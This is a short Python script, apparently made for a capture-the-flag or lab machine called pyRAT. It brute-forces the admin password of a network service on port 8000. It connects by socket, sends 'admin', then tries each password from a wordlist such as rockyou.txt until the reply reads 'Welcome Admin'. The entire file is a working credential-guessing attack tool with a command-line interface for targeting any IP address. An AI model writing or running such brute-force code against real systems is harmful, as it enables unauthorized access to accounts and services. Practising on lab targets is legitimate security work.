import socket
import sys
import argparse

def read_passwords(file_path):
    with open(file_path, "r", encoding='utf-8', errors='ignore') as f:
        for line in f:
            yield line.strip("\n")

def bruteforce(host, port, file_path):
    print("[+] Starting the script")
    try:
        for password in read_passwords(file_path):
        
        # Create a socket connection
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((host, port))

        # Send the word 'admin'
            client.sendall(b"admin")
            response = client.recv(1024).decode('utf-8')
        # Send the password
            client.sendall(bytes(password, encoding='utf8'))
            response = client.recv(1024).decode('utf-8')
            
            # Clear the previous output line completely using ANSI escape codes
            sys.stdout.write('\033[2K\033[1G')
            sys.stdout.write(f"[+] Trying password: {password}")
            sys.stdout.flush()

            if 'Welcome Admin' in response:
                sys.stdout.write('\033[2K\033[1G')
                print(f"[+] Password is: {password}")
                client.close()
                sys.exit(0)

            client.close()
    except Exception as e:
        print(f"[ERROR] Connection failed: {e}")

def main():
    # Example on how to use the script
    example = '''
    Example:
        python3 pyrat_brute.py -i 10.10.10.10 -f /usr/share/wordlists/rockyou.txt
'''
    
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Brute force admin password of pyRAT.", epilog=example, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('-i', '--ip', help='IP address of the target', required=True, metavar='ip_address')
    parser.add_argument('-f', '--file', help='Password list file', required=True, metavar='file_path')
    args = parser.parse_args()


    host = args.ip
    port = 8000
    file_path = args.file
    
    # Calling bruteforce function
    bruteforce(host, port, file_path)

if __name__ == "__main__":
    main()
